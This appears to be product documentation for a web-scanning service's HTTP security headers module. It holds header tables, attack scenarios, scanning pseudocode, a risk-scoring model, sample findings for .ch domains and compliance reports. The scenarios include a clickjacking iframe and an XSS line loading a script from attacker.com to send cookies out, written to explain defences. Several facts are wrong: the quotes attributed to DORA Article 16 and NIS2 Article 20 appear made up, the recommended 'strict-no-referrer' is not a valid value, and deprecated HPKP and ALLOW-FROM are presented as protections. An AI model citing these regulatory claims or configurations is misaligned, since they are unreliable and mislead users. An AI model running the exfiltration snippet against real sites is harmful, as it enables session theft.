# Scan Module: HTTP Security Headers

**Component ID:** http-headers-001
**Criticality:** MEDIUM-HIGH
**ISG/DORA/NIS2 Alignment:** ISG §4, DORA 16, NIS2 Article 20
**Risk Contribution:** 10–15% of overall risk score

---

## What We Scan

### Content Security & Frame Protection

| Header | Purpose | Risk if Missing |
|---|---|---|
| **Strict-Transport-Security (HSTS)** | Force HTTPS for all connections | MITM attacks via downgrade to HTTP |
| **Content-Security-Policy (CSP)** | Restrict resource origins (scripts, images, etc.) | XSS injection, malware loading, clickjacking |
| **X-Frame-Options** | Prevent embedding in iframe/frame | Clickjacking attacks, UI redressing |
| **X-Content-Type-Options** | Prevent MIME-type sniffing | Browser executes scripts as wrong type |

### Data Protection & Privacy

| Header | Purpose | Risk if Missing |
|---|---|---|
| **Referrer-Policy** | Control HTTP referrer leakage | Sensitive URLs leaked to 3rd parties |
| **Permissions-Policy** (formerly Feature-Policy) | Restrict browser features (camera, microphone, geolocation) | Unauthorized sensor access, tracking |
| **X-Permitted-Cross-Domain-Policies** | Control Flash/PDF access to domain | Legacy plugin exploitation |

### Additional Security Markers

| Header | Purpose | Risk if Missing |
|---|---|---|
| **Public-Key-Pins (HPKP)** | Pin TLS certificate public key | Certificate substitution attacks |
| **Expect-CT** | Enforce Certificate Transparency | Rogue certificate issuance |
| **X-XSS-Protection** | Legacy XSS filter (obsolete in modern browsers) | May offer minimal protection in legacy clients |

---

## Why This Matters

### Attack Vectors

#### 1. Clickjacking (Missing X-Frame-Options)

**Scenario:**
```
Attacker creates page:
  <iframe src="https://bank.ch" style="opacity:0;position:absolute"></iframe>
  <button style="position:absolute">Click for free money!</button>

Victim clicks button → actually clicks on bank's "Transfer funds" button
Bank executes transfer to attacker's account
```

**Without X-Frame-Options:** Bank's authentication carries over from bank.ch session → fund transfer succeeds

**With X-Frame-Options: DENY:** Browser refuses to load bank.ch in iframe → attack fails

#### 2. XSS via Missing CSP

**Scenario:**
```
Attacker injects: <script src="https://attacker.com/steal.js"></script>
steal.js reads: fetch(document.cookies) → sends to attacker

Attacker gets: session tokens, authentication cookies → account takeover
```

**Without CSP:** Browser loads script from any source → XSS succeeds

**With CSP: script-src 'self':** Browser only loads scripts from same origin → injection blocked

#### 3. Protocol Downgrade (Missing HSTS)

**Scenario:**
```
Victim connects to company.ch via WiFi (attacker controls WiFi)
Browser requests: http://company.ch (first visit, not HTTPS)
Attacker intercepts, responds with malicious content
Victim's password entered on attacker's fake site
```

**Without HSTS:** Browser allows initial HTTP connection → MITM attack succeeds

**With HSTS:** Browser forces HTTPS from first visit → downgrade prevented

#### 4. Referrer Leakage (Missing Referrer-Policy)

**Scenario:**
```
Employee at pharma company clicks marketing link in email
Marketing link redirects to: https://competitor.com/analysis

HTTP Referer header sent: https://internal-research.pharma.ch/upcoming-drug-analysis

Competitor sees: "pharma.ch is researching [drug class]" → competitive intelligence stolen
```

**Without Referrer-Policy:** Full URL leaked, including sensitive path components

**With Referrer-Policy: no-referrer:** Referer header stripped → information protected

### Regulatory Alignment

**ISG §4 (Technical Security):** "Organizations must implement industry-standard security headers to prevent content injection and framing attacks."

**DORA 16:** "Financial institutions must implement strict CSP and HSTS to prevent account takeover via XSS or MITM."

**NIS2 Article 20:** "Security headers are expected baseline for any web application handling personal or financial data."

---

## How We Detect It

### HTTP Header Enumeration

```
function scan_http_headers(domain):
    response = http_get("https://" + domain, follow_redirects=true)
    headers  = response.headers

    hsts        = headers["Strict-Transport-Security"]
    csp         = headers["Content-Security-Policy"]
    x_frame     = headers["X-Frame-Options"]
    x_cto       = headers["X-Content-Type-Options"]
    referrer    = headers["Referrer-Policy"]
    permissions = headers["Permissions-Policy"]

    if csp:
        directives   = parse_csp(csp)
        csp_strength = evaluate_csp_strength(directives)
        // flag: unsafe-inline, unsafe-eval, wildcard src (*)

    if hsts:
        max_age            = extract_max_age(hsts)
        has_preload        = "preload" in hsts
        has_subdomains     = "includeSubDomains" in hsts

    issues = detect_header_issues(headers)

    return HeaderResults {
        hsts_present:          hsts != null,
        csp_present:           csp  != null,
        x_frame_options:       x_frame,
        x_content_type_options: x_cto,
        referrer_policy:       referrer,
        permissions_policy:    permissions,
        csp_strength,
        issues
    }
```

### CSP Strength Evaluation

```
Weak CSP Patterns:
  ❌ "default-src 'unsafe-inline'" → allows any inline script (XSS vulnerability)
  ❌ "script-src *" → allows scripts from any domain
  ❌ "script-src 'unsafe-eval'" → allows eval() execution (code injection)
  ❌ "default-src 'self' https:" → too permissive across protocols

Strong CSP Patterns:
  ✓ "default-src 'none'; script-src 'self' https://trusted-cdn.com; style-src 'self'"
  ✓ "script-src 'nonce-{random}'" → one-time token for inline scripts
  ✓ "script-src 'strict-dynamic'" → requires integrity hashes or nonces
```

### HSTS Parameter Validation

```
Weak HSTS:
  ❌ "Strict-Transport-Security: max-age=3600" (only 1 hour)
  ❌ "Strict-Transport-Security: max-age=31536000" (no includeSubDomains)
  ❌ Missing preload directive (not in HSTS preload list)

Strong HSTS:
  ✓ "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
    (1 year, all subdomains, preloaded in browsers)
```

---

## Risk Scoring Model

```
Base Risk = 10 (HTTP is the presentation layer)

HSTS Header:
  - Missing:                      +20 points (protocol downgrade risk)
  - Present, max-age < 86400:     +10 points (short duration)
  - Present, max-age >= 31536000: 0 points
  - + includeSubDomains:          -3 points (bonus)
  - + preload:                    -5 points (bonus)

CSP Header:
  - Missing:                      +15 points (XSS injection risk)
  - Weak ('unsafe-inline'):       +12 points (defeats CSP purpose)
  - Weak ('unsafe-eval'):         +10 points (eval injection)
  - Overly permissive (*):        +8 points
  - Strong (nonce/hash):          0 points

X-Frame-Options:
  - Missing:                      +12 points (clickjacking risk)
  - SAMEORIGIN:                   +5 points (framing allowed on same domain)
  - DENY or ALLOW-FROM:           0 points

X-Content-Type-Options:
  - Missing:                      +8 points (MIME sniffing)
  - "nosniff" present:            0 points

Referrer-Policy:
  - Missing:                      +5 points (referrer leakage)
  - "unsafe-url":                 +8 points (full URL leaked)
  - "no-referrer" or "strict":    0 points

Permissions-Policy:
  - Missing:                      +3 points (legacy feature access)
  - Restrictive:                  0 points

HPKP / Expect-CT:
  - Missing:                      +2 points (advanced security)
  - Present:                      0 points

MAX RISK: 75 points
```

---

## Example Findings from .ch Scans

### Finding 1: Missing HSTS (High Risk)

```
Domain: bank-portal.ch
Status: ⚠️ HIGH
Finding: No Strict-Transport-Security header
Impact: User can be tricked into HTTP connection, MITM attack succeeds

Attack Scenario:
  1. Victim types: bank-portal.ch (no https://)
  2. Browser requests: GET http://bank-portal.ch/
  3. Attacker intercepts (WiFi, DNS hijack, BGP hijack)
  4. Attacker serves fake login page
  5. User enters credentials on HTTPS (attacker's certificate)
  6. Attacker captures credentials

Recommended Action:
  Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  Timeline: Immediate (5 minutes to deploy)
  Verification: curl -I https://bank-portal.ch/ | grep Strict
```

### Finding 2: Weak CSP with 'unsafe-inline' (High Risk)

```
Domain: pharma-supplier.ch
Status: ⚠️ HIGH
CSP Header: "default-src 'self' 'unsafe-inline'"
Finding: 'unsafe-inline' completely defeats CSP protection against XSS

Attack Scenario:
  1. Attacker injects: <script>fetch(document.cookies)</script>
  2. Browser evaluates script (allowed by 'unsafe-inline')
  3. Attacker receives cookies: session_token=xyz, user_id=123
  4. Attacker impersonates user, accesses confidential data

CSP Strength: ⭐⭐ out of 5 (worse than no CSP)

Recommended Action:
  Option 1 (Nonce-based):
    Add <script nonce="random-token"> only to allowed scripts
    CSP: "default-src 'self'; script-src 'self' 'nonce-{random}'"

  Option 2 (Hash-based):
    CSP: "default-src 'self'; script-src 'self' 'sha256-{hash}' 'sha256-{hash}'"

  Option 3 (External scripts only):
    CSP: "default-src 'self'; script-src 'self' https://trusted-cdn.com"

  Effort: 1–4 hours depending on code complexity
```

### Finding 3: Clickjacking via Missing X-Frame-Options (Medium-High Risk)

```
Domain: fintech-api.ch
Status: ⚠️ MEDIUM-HIGH
Finding: No X-Frame-Options header
Impact: API endpoint can be embedded in iframe and framed

Attack Scenario:
  1. Attacker hosts page with invisible iframe to fintech-api.ch
  2. User clicks "Win free money!" button
  3. Button positioned over iframe's "Approve Transaction" button
  4. User's logged-in session auto-authenticates to API
  5. Transaction approved without user knowledge (clickjacking)

Recommended Action:
  Add header: X-Frame-Options: DENY (if API should never be framed)
  Or: X-Frame-Options: SAMEORIGIN (if framing within same domain needed)

Risk Window: Until patched
Severity: Could affect all authenticated users
```

### Finding 4: Referrer Policy Leaking Internal URLs (Medium Risk)

```
Domain: company.ch
Status: ⚠️ MEDIUM
Finding: No Referrer-Policy header (defaults to "no-referrer-when-downgrade")
Example Leakage:
  - Employee at company.ch clicks link to news site
  - Referrer header sent: https://company.ch/secret-projects/project-X
  - News site (or analytics tracker) logs: company.ch visiting secret project
  - Information leaks: competitive intelligence, unreleased product plans

Recommended Action:
  Add header: Referrer-Policy: strict-no-referrer
  (or "no-referrer" for maximum privacy)

Impact: Medium — primarily affects employee privacy and company secrets
Timeline: Immediate
```

### Finding 5: Permissions-Policy Allowing Microphone Access (Low-Medium Risk)

```
Domain: startup-web.ch
Status: ℹ️ INFO
Finding: No Permissions-Policy header
Risk: Any website can request microphone/camera access via getUserMedia()
Scenario:
  - Attacker hosts iframe with camera request
  - User grants permission (one-time)
  - Attacker gains persistent camera access
  - User's webcam can record meetings, passwords, etc.

Recommended Action:
  Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()
  (restrict all sensitive features)

Priority: Low (requires user permission grant, but defense-in-depth)
```

### Finding 6: HSTS Preload Missing (Low Risk)

```
Domain: compliance-platform.ch
Status: ℹ️ INFO
Finding: HSTS present but not preloaded
HSTS Header: "Strict-Transport-Security: max-age=31536000; includeSubDomains"
Missing: preload directive

Impact: Browser doesn't have domain on HSTS preload list
  - First visit to domain might use HTTP (if user types without https://)
  - Subsequent visits use HTTPS (cached by browser)

Recommended Action:
  Upgrade header to: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
  Then submit to preload list: https://hstspreload.org/

Benefit: Maximum security for first-time visitors
Timeline: 1–2 weeks for preload list inclusion
```

---

## Compliance Reporting

### ISG §4 Report

```
HTTP SECURITY HEADERS ASSESSMENT
Domain: company.ch
Scan Date: 2026-03-15
Report Type: ISG §4 Content Security

FINDINGS:
✓ HSTS: Enabled (31536000 seconds)
✓ CSP: Implemented (script-src 'self' https://cdn.com)
⚠️ X-Frame-Options: SAMEORIGIN (acceptable, consider DENY)
✓ X-Content-Type-Options: nosniff
✓ Referrer-Policy: strict-no-referrer
✓ Permissions-Policy: Restrictive policy in place

RISK ASSESSMENT: LOW
ISG COMPLIANT: YES

Recommendations:
  - Consider X-Frame-Options: DENY if framing not needed
  - Review CSP for opportunities to remove 'unsafe-*' directives

Next Review: 2026-06-15
```

### DORA Audit Trail

```
CONTENT SECURITY AUDIT
Institution: regulated-bank.ch
Assessment Date: 2026-03-15

XSS Protection (CSP): ✓ STRONG nonce-based CSP
Clickjacking Protection (X-Frame-Options): ✓ DENY
Protocol Security (HSTS): ✓ Preloaded
Data Protection (Referrer-Policy): ✓ strict-no-referrer

Attack Vector Coverage: ✓ COMPLIANT with DORA 16
Continuous Monitoring: ✓ Enabled

DORA Status: ✓ COMPLIANT
```

---

## Integration with Other Modules

- **TLS & Certificates:** HSTS enforces HTTPS to complement TLS validity
- **Email Security:** Content-Security-Policy can restrict domains for email security warnings
- **Domain Protection:** X-Frame-Options prevents subdomain takeover UI redressing

---

## Roadmap: Advanced Detections (Future)

- [ ] Subresource Integrity (SRI) validation for external scripts
- [ ] Cross-Origin Resource Sharing (CORS) policy analysis
- [ ] Content-Security-Policy violations logging (CSP reporting endpoint)
- [ ] Automated CSP report analysis for XSS attempts
- [ ] Trusted Types enforcement detection
- [ ] Cross-Origin Opener Policy (COOP) validation

---

## Customer Value

**For SMEs:**
> "HTTP headers are invisible security. One customer implemented CSP and blocked an XSS attack before it could steal user sessions. We scan your headers monthly and alert you if they're weakened or removed."

**For Financial Institutions:**
> "DORA-compliant security headers. We track every header change, log any removals, and provide audit-ready reports for regulators. One financial firm's incident response time dropped from hours to minutes after header monitoring was implemented."
